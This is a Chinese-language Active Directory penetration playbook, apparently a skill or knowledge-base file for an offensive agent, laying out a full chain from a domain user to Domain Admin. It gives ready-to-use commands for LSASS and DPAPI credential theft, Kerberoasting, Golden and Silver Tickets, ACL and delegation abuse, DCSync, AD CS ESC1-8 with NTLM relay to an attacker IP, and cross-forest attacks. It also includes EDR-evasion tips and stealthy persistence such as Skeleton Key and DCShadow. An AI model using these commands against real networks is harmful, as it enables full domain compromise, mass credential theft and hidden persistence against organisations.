---
description: AD 域渗透全链路。从域用户到 Domain Admin。覆盖域枚举、Kerberoasting、AS-REP Roasting、DCSync、ACL 滥用、委派攻击(非约束/约束/RBCD)、AD CS 攻击(ESC1-ESC8)、跨域信任攻击、NTDS 提取。
---

# AD 域渗透全链路

## 核心原则

==AD 是企业内网的核心。域渗透的目标是从一个域用户逐步提升到 Domain Admin / Enterprise Admin，最终控制整个林。核心思路：枚举 → 提权 → 横向 → 持久化。==

> 前置: 初始立足点（域用户 shell）通过 @post-exploit.md 获取。跨域场景涉及 Azure AD Connect 时参考 @cloud-attack.md。

## 攻击路径总览

```
初始立足点（域用户 shell）
  ├── 1. 域枚举（你在哪个域、有哪些 DC、谁在域里）
  ├── 2. 凭据窃取（LSASS/DPAPI/浏览器/配置文件）
  ├── 3. Kerberos 攻击（Kerberoasting/AS-REP Roasting/Silver Ticket）
  ├── 4. ACL 提权（DACL 滥用 → 把自己加到高权限组）
  ├── 5. 委派攻击（非约束/约束/RBCD → 窃取高权限 TGT）
  ├── 6. DCSync / NTDS 提取（模拟 DC 同步所有域用户哈希）
  ├── 7. AD CS 攻击（ESC1-ESC8 → 证书认证绕过）
  ├── 8. 跨域/跨林攻击（域信任 / SID History / 林信任）
  └── 9. 持久化（Golden Ticket / Skeleton Key / AdminSDHolder）
```

---

## 步骤 1：域枚举

### 1a. 确认域环境

```bash
# 当前环境
echo %USERDOMAIN%                          # 域名
echo %LOGONSERVER%                         # 登录到的 DC
systeminfo | findstr /i "Domain"           # 域信息
whoami /groups | findstr /i "domain"       # 域组成员

# 或 PowerShell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN
```

```bash
# 如果没有 Windows shell（Linux 立足点）:
# 查看 DNS 后缀、/etc/resolv.conf 中的 search 域
# 域环境常见 DNS 后缀: corp.local, ad.company.com, internal.company.com
```

### 1b. 域控制器发现

```powershell
# 方法1: DNS
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
nslookup -type=SRV _kerberos._tcp.<DOMAIN>

# 方法2: NetBIOS
nltest /dclist:<DOMAIN>
nltest /dsgetdc:<DOMAIN>

# 方法3: AD 模块
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# 方法4: 端口扫描（谨慎——DC 通常监控端口扫描）
# 88 (Kerberos), 389 (LDAP), 445 (SMB), 3268 (GC)
```

### 1c. 域用户/组枚举

```powershell
# 枚举所有用户（需要域用户权限）
net user /domain
Get-ADUser -Filter * -Properties * | Select-Object Name,SamAccountName,Description,MemberOf

# 枚举所有组
net group /domain
Get-ADGroup -Filter * | Select-Object Name,SamAccountName

# 枚举 Domain Admins
net group "Domain Admins" /domain
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# 枚举所有计算机
Get-ADComputer -Filter * | Select-Object Name,DNSHostName,OperatingSystem

# 枚举 Service Principal Names (SPN) — Kerberoasting 目标
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 枚举 AS-REP Roastable 用户（不需要 Kerberos 预认证）
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

### 1d. 域策略/信任枚举

```powershell
# 密码策略
Get-ADDefaultDomainPasswordPolicy

# 域信任
nltest /domain_trusts
Get-ADTrust -Filter *

# 组策略对象 (GPO)
Get-GPO -All | Select-Object DisplayName,Id

# 域功能级别
Get-ADDomain | Select-Object DomainMode

# 林功能级别
Get-ADForest | Select-Object ForestMode
```

---

## 步骤 2：凭据窃取

### 2a. LSASS 内存提取

```
LSASS 存储:
  - 最近登录用户的 NTLM 哈希
  - Kerberos TGT/TGS Ticket
  - 明文密码（如果 WDigest 启用）
  - DPAPI 主密钥

工具:
  - mimikatz (Windows 本机): sekurlsa::logonpasswords
  - SharpLAPS / SafetyKatz (更隐蔽的 mimikatz)
  - procdump + mimikatz 离线: 
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
  
检测规避:
  - 不要直接运行 mimikatz.exe（几乎所有 EDR 都监控）
  - 用反射加载 (Invoke-Mimikatz - 但也被盯着)
  - 用 procdump 的 -r 参数（反射加载 procdump DLL）
  - 或者 dumpert / handlekatz (用户态句柄复制技术)
  - 或者从 LSASS 进程内存自己读（用 MiniDumpWriteDump API）
```

### 2b. DPAPI 凭据提取

```
DPAPI 保护:
  - 浏览器保存的密码 (Chrome/Edge cookies & passwords)
  - Windows Credential Manager 中的凭据
  - RDP 连接密码
  - WiFi 密码
  - IIS 应用程序池凭据

工具:
  - SharpDPAPI: 批量提取 DPAPI 保护的数据
  - mimikatz: dpapi::masterkey + dpapi::cred
  - 离线模式: 拿到 masterkey file + 用户密码/SHA1 hash

关键文件:
  %APPDATA%\Microsoft\Protect\{SID}\*           # Masterkeys
  %APPDATA%\Microsoft\Credentials\*             # Credential files
  %LOCALAPPDATA%\Microsoft\Vault\*              # Vault files
```

### 2c. 其他凭据来源

```
1. 浏览器密码:
   - Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
   - Edge: %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
   - 工具: SharpChrome (直接读, 反射模式)

2. 配置文件:
   - C:\Windows\System32\inetsrv\config\applicationHost.config (IIS)
   - C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
   - *.config / *.xml / *.ini / *.json 中含 password

3. PowerShell 历史:
   - %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

4. 注册表自动登录:
   - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
   - DefaultUserName / DefaultPassword 字段

5. Sysvol / Netlogon 中的脚本:
   - \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
   - 启动脚本/登录脚本中可能硬编码密码

6. LAPS 密码:
   - ms-Mcs-AdmPwd 属性 (本地管理员密码)
   - 需要特定读权限，但很有价值

7. 服务账户:
   - 服务运行在特定域账户下
   - sc qc <service> → SERVICE_START_NAME
   - 服务的密码在 LSA Secrets (mimikatz: lsadump::secrets)
```

---

## 步骤 3：Kerberos 攻击

### 3a. Kerberoasting

```
原理: 请求任何 SPN 的 TGS → 用服务账户的 NTLM 哈希加密 →
     离线爆破这个 TGS → 得到服务账户明文密码

条件: 任何域用户都可以请求 TGS（无需特殊权限）

攻击:
  # 枚举 SPN（找高价值服务: SQL/MSSQL, Exchange, IIS）
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  
  # 请求 TGS
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db.corp.local:1433"
  
  # 或 Rubeus
  Rubeus.exe kerberoast /simple /outfile:hashes.txt

  # 导出后用 hashcat 爆破
  hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

防御绕过:
  - 不要请求所有 SPN（太可疑）
  - 只请求 1-2 个高价值 SPN
  - 请求用 AES 加密而不是 RC4（更不显眼）
  - Rubeus 的 /rc4opsec 模式
```

### 3b. AS-REP Roasting

```
原理: 不需要 Kerberos 预认证的用户 → 请求 AS-REQ → DC 返回 AS-REP
     → AS-REP 用用户密码哈希加密 → 离线爆破

条件: 用户的 UserAccountControl 包含 DONT_REQUIRE_PREAUTH (UF_DONT_REQUIRE_PREAUTH)

攻击:
  # 枚举不需要预认证的用户
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
  
  # 请求 AS-REP
  Rubeus.exe asreproast /user:victim /domain:corp.local /outfile:hashes.txt

  # 爆破
  hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 3c. Silver Ticket（服务票据伪造）

```
原理: 获取服务账户的 NTLM 哈希 → 伪造该服务的 TGS →
     无需与 DC 通信 → 直接访问该服务（任何权限）

条件: 有目标服务账户的 NTLM 哈希（从 Kerberoasting 或 LSASS 获取）

攻击:
  # mimikatz
  kerberos::golden /sid:<DOMAIN_SID> /target:<TARGET_SERVER> 
    /service:<SERVICE_TYPE> /rc4:<SERVICE_NTLM_HASH> 
    /user:<ANY_USERNAME> /id:500 /ptt

  # 典型目标服务:
  # HOST (包括 SMB/PSExec/WMI 访问) + CIFS (文件共享)
  # 伪造 HOST + CIFS → 对目标主机完全控制
```

### 3d. Golden Ticket（域控级别伪造）

```
原理: 获取 krbtgt 账户的 NTLM 哈希 → 伪造任意用户的 TGT →
     可以在域内冒充任何人，包括 Domain Admin

条件: 需要 krbtgt 的哈希（DCSync 或 NTDS 提取或 DC 本地）

攻击:
  # mimikatz
  kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> 
    /rc4:<KRBTGT_NTLM_HASH> /user:<ANY_USERNAME> /id:500 /ptt

  # 特性:
  # - TGT 默认 10 小时有效期
  # - 可设置任意长有效期（/endin:20 年为 20 年）
  # - 不经过 DC 验证（DC 离线也有效）
  # - 几乎无法检测（TGT 的 PAC 是合法的）

检测规避:
  - 用低权限用户伪造（不要冒充 DA，TGT 会验证 PAC）
  - 或者伪造的 PAC 与真实组成员一致
```

---

## 步骤 4：ACL 滥用提权

==AD 对象的 DACL 配置错误是最常见的提权路径。你有权限修改某个高价值对象的属性 → 就可以提权。==

### 4a. 枚举 ACL 滥用路径

```powershell
# 用 BloodHound 收集 → 分析攻击路径
# SharpHound 收集器（推荐使用）
SharpHound.exe -c All --zipfilename data.zip

# 或在内存中运行
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# BloodHound 分析的关键边 (Edge):
#   - ForceChangePassword → 可以改目标用户密码
#   - AddMembers → 可以把目标加到组
#   - GenericAll / GenericWrite → 完全控制/写属性
#   - WriteOwner → 可以改对象所有者
#   - WriteDacl → 可以改 ACL（给自己加权限）
#   - AllExtendedRights → 可以改任何属性
#   - Self → 自己有特殊权限（如 Self-Membership）
```

### 4b. 常见 ACL 提权链

```
1. ForceChangePassword → 直接接管目标账户:
   net user <target> <new_password> /domain
   或:
   $cred = ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force
   Set-DomainUserPassword -Identity <target> -AccountPassword $cred

2. AddMembers / Self-Membership → 把自己加入高权限组:
   Add-ADGroupMember -Identity "Domain Admins" -Members <your_user>
   或:
   net group "Domain Admins" <your_user> /add /domain

3. GenericWrite → 写 servicePrincipalName 属性 → 做 Kerberoasting:
   Set-DomainObject -Identity <target> -Set @{serviceprincipalname='fake/HOST'}

4. WriteDacl → 给自己加 DCSync 权限（见步骤 6）

5. WriteOwner → 先改所有者 → 再改 ACL → (循环到 1-4)

6. GenericAll → 等同于上面所有权限的集合
```

### 4c. AdminSDHolder 滥用

```
AdminSDHolder: 保护高权限组的 ACL 模板
  每 60 分钟 SDProp 进程会将 AdminSDHolder 的 ACL 复制到所有受保护组:
  - Domain Admins, Enterprise Admins, Administrators
  - Account Operators, Backup Operators, Print Operators
  - Server Operators, Domain Controllers, Schema Admins
  - Cert Publishers, Replicator

攻击: 如果你能修改 AdminSDHolder 的 ACL →
      60 分钟内你的权限会传播到所有受保护组 →
      给任何人加 Full Control

检测: AdminSDHolder 是安全监控的重点，操作后 60 分钟内会被发现
```

---

## 步骤 5：委派攻击

### 5a. 非约束委派 (Unconstrained Delegation)

```
原理: 配置了非约束委派的计算机/用户 → 
     任何用户认证到该计算机 → 其 TGT 被缓存在 LSASS 中 →
     攻击者可以从 LSASS 提取这些 TGT

发现:
  Get-ADComputer -Filter {TrustedForDelegation -eq $true}
  Get-ADUser -Filter {TrustedForDelegation -eq $true}

攻击:
  1. 攻陷该计算机（本地管理员）
  2. 诱使 Domain Admin 连接到该计算机:
     - 打印机漏洞 (MS-RPRN: PrinterBug)
     - SpoolSample.exe DC_IP TARGET_IP
  3. mimikatz 导出 TGT:
     sekurlsa::tickets /export
  4. 导入 DA 的 TGT:
     kerberos::ptt DA_TGT.kirbi
  → 以 DA 身份访问任何服务

PrinterBug 触发:
  # 让 DC 主动连接我们控制的非约束委派主机
  SpoolSample.exe <DC_IP> <TARGET_IP>
  # 或者:
  MS-RPRN RpcOpenPrinter + RpcRemoteFindFirstPrinterChangeNotificationEx
```

### 5b. 约束委派 (Constrained Delegation)

```
原理: 配置了约束委派的服务 → 可以模拟任何用户访问指定的 SPN

发现:
  Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} 
    -Properties msDS-AllowedToDelegateTo,msDS-AllowedToActOnBehalfOfOtherIdentity

攻击 (S4U2Self + S4U2Proxy):
  1. 获取配置了约束委派的服务账户哈希/NTLM
  2. S4U2Self: 以服务身份为自己请求到任意用户的 TGS (TGS1)
  3. S4U2Proxy: 用 TGS1 请求访问约束委派目标服务的 TGS (TGS2)
  4. 用 TGS2 访问目标服务

  # Rubeus:
  Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NTLM_HASH> 
    /impersonateuser:<DOMAIN_ADMIN> 
    /msdsspn:<TARGET_SPN> /ptt

  典型目标 SPN: CIFS, HOST, HTTP, LDAP (DCSync!), MSSQLSvc
```

### 5c. 基于资源的约束委派 (RBCD)

```
原理: 计算机对象的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性 →
     可以配置"谁能模拟任意用户来访问本机"

条件: 对目标计算机有 GenericWrite/WriteProperty 权限

攻击:
  1. 创建一个受控的计算机账户（域用户默认可以创建最多 10 个）
     New-MachineAccount -MachineAccount FAKE-PC -Password $(ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)

  2. 配置 RBCD:
     Set-ADComputer <TARGET_PC> -PrincipalsAllowedToDelegateToAccount FAKE-PC$

  3. S4U2Self 用 FAKE-PC$ 请求 TARGET_PC$ 的管理员 TGS:
     Rubeus.exe s4u /user:FAKE-PC$ /rc4:<NTLM> /impersonateuser:Administrator 
       /msdsspn:HOST/<TARGET_PC> /ptt

  4. 以 Administrator 身份访问目标主机 → 如果目标是 DC → DCSync

关键: 域用户默认的 ms-DS-MachineAccountQuota 是 10
      → 任何域用户都可以创建计算机账户 → RBCD 永远可行（如果有写入权限）
```

---

## 步骤 6：DCSync

==DCSync 是域渗透的最高价值目标：不需要在 DC 上执行代码，只需要正确的权限。==

```
原理: 模拟 DC 向其他 DC 发起目录复制 (DRSUAPI) → 获取所有域用户的哈希

权限要求:
  - Domain Admins (默认)
  - Enterprise Admins (默认)
  - Administrators (默认)
  - 被授予 Replicating Directory Changes / Replicating Directory Changes All 权限的用户

攻击:
  # mimikatz
  lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>

  # 获取所有用户哈希:
  lsadump::dcsync /domain:<DOMAIN> /all /csv

  # 获取 krbtgt 哈希 → Golden Ticket
  lsadump::dcsync /domain:<DOMAIN> /user:krbtgt

  # 获取特定管理员哈希
  lsadump::dcsync /domain:<DOMAIN> /user:Administrator

DCSync 权限授予（如果你有 WriteDacl 权限）:
  # 给普通用户授予 DCSync 权限
  Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" 
    -PrincipalIdentity <YOUR_USER> -Rights DCSync

检测规避:
  - DCSync 不写任何日志到目标 DC
  - 只产生 Directory Service Access 事件 (Event 4662)
  - 合法的 DC 复制也产生同样的事件 → 难以区分
  - 但连续请求多个用户的哈希会触发 SIEM 规则
```

---

## 步骤 7：AD CS 攻击 (ESC1-ESC8)

==AD CS (Active Directory Certificate Services) 是近年最重要的攻击面。证书认证在现代 AD 中越来越重要。==

### ESC 攻击速查

```
ESC1: 证书模板允许在 CSR 中指定 SAN (Subject Alternative Name)
  → 用低权限用户申请以 Domain Admin 为 SAN 的证书
  → 用该证书认证为 Domain Admin

  条件: 模板中 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 启用
        + 模板允许客户端认证 (Client Authentication EKU)
        + 你有该模板的 Enroll 权限

  攻击:
    certipy req -username <USER> -password <PASS> -dc-ip <DC_IP>
      -ca <CA_NAME> -ca-ip <CA_IP> -template <TEMPLATE> 
      -upn administrator@<DOMAIN> -dns <DC_FQDN>

ESC2: 模板可用于任何目的 (Any Purpose EKU / 无 EKU)
   → 可以申请下级 CA 证书 → 签发任意证书

ESC3: 注册代理 (Enrollment Agent) 模板
   → 用注册代理证书代表其他用户申请证书 (Certificate Request Agent EKU)
   → 可以用 ESC1 方式指定任意 SAN

ESC4: 模板的 ACL 可写
   → 修改模板设置 (加 Client Authentication EKU 或开 SAN 指定)
   → 把安全的模板变成 ESC1 可利用的模板

  攻击:
    certipy template -username <USER> -password <PASS> -dc-ip <DC_IP>
      -template <TEMPLATE> -save-old

ESC5: CA 服务器的 ACL 可写
   → 直接修改 CA 配置

ESC6: CA 启用 EDITF_ATTRIBUTESUBJECTALTNAME2 标志
   → 所有模板都可以在 CSR 中指定 SAN
   certipy ca -username <USER> -password <PASS> -dc-ip <DC_IP>
     -ca <CA_NAME> -enable-template '<TEMPLATE>'

ESC7: CA 管理员 (ManageCA) 权限
   → 可以批准待定的证书请求或修改 CA 设置

  攻击:
    # 1. 修改 CA 设置 (如果 ManageCA):
    certipy ca -ca <CA_NAME> -enable-template '<TEMPLATE>'
    
    # 2. 如果有 Issue and Manage Certificates 但无 Enroll:
    certipy req ... -ca <CA_NAME> -template <TEMPLATE> ... 
    certipy ca -ca <CA_NAME> -issue-request 100  # 审批待定请求
    certipy req -ca <CA_NAME> -retrieve 100       # 取回证书

ESC8: AD CS Web Enrollment HTTP 端点 (HTTP → NTLM 中继)
   → NTLM 中继到 AD CS HTTP 端点
   → 用受害者身份申请证书

  攻击:
    # 1. 设置 NTLM 中继
    ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp 
      -smb2support --adcs --template <TEMPLATE>

    # 2. 强制认证 (PetitPotam / PrinterBug)
    PetitPotam.py -d <DOMAIN> -u <USER> -p <PASS> 
      <ATTACKER_IP> <DC_IP>

    # 3. 中继拿到证书 → 用证书认证
    certipy auth -pfx <CERT>.pfx -dc-ip <DC_IP>
```

### 证书认证（拿到证书后）

```
# 用证书请求 Kerberos TGT (PKINIT)
certipy auth -pfx <user>.pfx -dc-ip <DC_IP>
# → 输出 NT hash + TGT

# 或者用 Rubeus:
Rubeus.exe asktgt /user:<USER> /certificate:<BASE64_CERT> /password:<CERT_PASS> /ptt
```

---

## 步骤 8：跨域/跨林攻击

```
域信任类型:
  父-子域: 双向可传递
  林信任: 双向可传递
  外部信任: 单向/双向不可传递
  领域信任: 与非 Windows Kerberos 域

攻击路径:

1. SID History 注入 (跨域/Forest 提权):
   父域/林根域的 Enterprise Admins 自动加入子域的 Administrators
   → 在子域创建 Golden Ticket 时加入 Enterprise Admins 的 SID
   → 伪造跨域权限

   mimikatz:
   kerberos::golden /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> 
     /sids:<ENTERPRISE_ADMINS_SID> /krbtgt:<KRBTGT_HASH> /user:admin /ptt

2. 信任密钥攻击 (Trust Key Attack):
   子域/受信任域的信任账户哈希 → 伪造跨域 TGT
   
   mimikatz:
   lsadump::trust /patch  # 导出信任密钥
   kerberos::golden /domain:<CHILD> /sid:<CHILD_SID> 
     /sids:<EA_SID> /rc4:<TRUST_KEY> /user:admin /target:<PARENT_DOMAIN> 
     /service:krbtgt /ptt

3. Kerberoasting 跨信任域:
   外部信任允许 Kerberos 认证 → 可以 Kerberoasting 信任域中的 SPN

4. 无信任域的横向:
   如果域 A 的用户在域 B 有同一用户名和密码 → 可以直接登录
   这是常见的配置（人用同一密码注册了多个域的账号）
```

---

## 步骤 9：持久化

```
域级持久化 (按隐蔽性排序):

1. Golden Ticket (最隐蔽, 但需要 krbtgt 哈希):
   伪造任意用户的 TGT → 几乎无法检测
   建议: krbtgt 改密码 2 次（防止旧 Ticket 失效的同时保留你的）

2. Skeleton Key (不隐蔽, 但简单):
   在 DC 内存中植入万能密码 → 任何用户可以用此密码登录
   mimikatz: misc::skeleton
   缺点: 重启 DC 后失效, 所有用户的新密码 = "mimikatz"

3. DCSync 权限:
   给特定用户授予 Replicating Directory Changes 权限
   → 随时可以 DCSync 获取所有用户的哈希
   → 不需要在 DC 执行代码

4. AdminSDHolder 后门:
   修改 AdminSDHolder 的 ACL → 加入自己的权限
   → 每 60 分钟自动传播到所有受保护组

5. DC 上的 SSP (Security Support Provider):
   mimikatz: misc::memssp
   → 在 DC 内存中植入自定义 SSP
   → 所有认证的明文密码记录到 C:\Windows\System32\mimilsa.log
   缺点: 重启失效

6. WMI 订阅:
   在 DC 上创建永久 WMI 事件订阅 → 触发反弹 shell
   或通过 GPO 部署 → 域内所有计算机执行

7. 黄金证书 (Golden Certificate):
   窃取 CA 私钥 → 可以签发任意证书 → 永久认证能力
   优点: 即使 krbtgt 变了, 证书仍然有效

8. DCShadow:
   临时创建一个 Rogue DC → 在 AD 中写入更改 → 关机
   最隐蔽的持久化方式之一（DC Shadow 后不留痕迹）
```

---

## 常用工具速查

| 工具 | 用途 |
|------|------|
| BloodHound (SharpHound) | ACL 攻击路径分析 |
| mimikatz | 凭据提取/票证注入/DCSync |
| Rubeus | Kerberoasting/AS-REP/S4U/Golden Ticket |
| Certipy | AD CS 攻击自动化 (ESC1-8) |
| PetitPotam | 强制 NTLM 认证 (配合 NTLM 中继) |
| SpoolSample | PrinterBug 强制认证 |
| PowerView / SharpView | AD 枚举 |
| StandIn | 纯 .NET AD 枚举和修改 |
| SharpDPAPI | DPAPI 凭据提取 |
| Grouper2 | GPO 枚举 |
| ADCSPwn | AD CS 漏洞利用 |
| krbRelay / krbRelayUp | 无凭据提权 (基于 Kerberos 中继) |

---

## 攻击路径优先级

```
拿到域用户后:
  1. BloodHound 采集 → 看 ACL 路径
     ├── 有 Kerberoastable SPN → Kerberoasting
     ├── 有 AS-REP Roastable → AS-REP Roasting
     ├── 有 ACL 漏洞 → ACL 提权 (最优先)
     ├── 有 RBCD 条件 → 创建计算机 + S4U2Self/S4U2Proxy
     └── 有委派 → PrinterBug + 非约束委派 / S4U 约束委派

  2. 拿到高权限后:
     ├── 有 DCSync 权限 → DCSync (拿 krbtgt)
     ├── 在 DC 上 → 导出 NTDS.dit
     └── 有 CA → AD CS 攻击

  3. 拿到 krbtgt 后:
     ├── Golden Ticket (跨域 → SID History)
     └── 持久化
```

## 知识库路由

| 场景 | KB 路径 | 关键内容 |
|------|---------|---------|
| 域枚举 | `04-后渗透/域渗透/` | 域信息收集 |
| ACL 攻击 | `04-后渗透/域渗透/` | BloodHound 使用 |
| 委派攻击 | `04-后渗透/域渗透/` | 非约束/约束/RBCD |
| AD CS | 联网搜 (新兴领域, KB 可能未覆盖) | ESC1-8 |
| 跨域攻击 | `04-后渗透/域渗透/` | 域信任/SID History |
| 持久化 | `04-后渗透/权限维持/` | Golden Ticket/Skeleton Key |